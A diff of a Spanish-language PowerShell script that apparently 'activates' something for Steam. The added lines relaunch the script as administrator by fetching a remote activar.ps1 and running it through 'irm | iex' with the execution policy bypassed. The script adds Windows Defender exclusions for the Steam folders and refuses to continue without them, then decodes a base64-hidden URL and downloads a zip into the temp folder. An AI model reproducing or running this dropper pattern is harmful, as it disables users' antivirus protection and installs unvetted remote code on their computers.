@@ -28,7 +28,6 @@ function Get-SteamRoots {
 }
 $roots=Get-SteamRoots
 if(-not $roots -or $roots.Count -eq 0){ Write-Host 'No se encontro Steam instalado en esta PC.'; return }
-foreach($er in $roots){ try { Add-MpPreference -ExclusionPath $er -ErrorAction Stop } catch {} }
 function Test-Excluded([string]$p){
   try {
     $ex=(Get-MpPreference -ErrorAction Stop).ExclusionPath
@@ -38,6 +37,16 @@ function Test-Excluded([string]$p){
 }
 $okRoots=@()
 foreach($er in $roots){ if(Test-Excluded $er){ $okRoots+=$er } }
+if($okRoots.Count -eq 0){
+  $admin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+  if(-not $admin){
+    Write-Host 'Solicitando permisos de administrador...'
+    try { Start-Process powershell -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-Command','irm https://cdn.jsdelivr.net/gh/bastisayes/BastissSteamV18@main/activar.ps1 | iex') -Verb RunAs } catch {}
+    return
+  }
+  foreach($er in $roots){ try { Add-MpPreference -ExclusionPath $er -ErrorAction Stop } catch {} }
+  foreach($er in $roots){ if(Test-Excluded $er){ $okRoots+=$er } }
+}
 if($okRoots.Count -eq 0){ Write-Host 'error, sin exclusion.'; return }
 $zipUrl=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmVsZWFzZXMvZG93bmxvYWQvYmFzdGlzc3MvcGFyY2hlX251ZXZvLnppcA=='))
 $zip=Join-Path $env:TEMP ("act_" + (Get-Random) + ".zip")
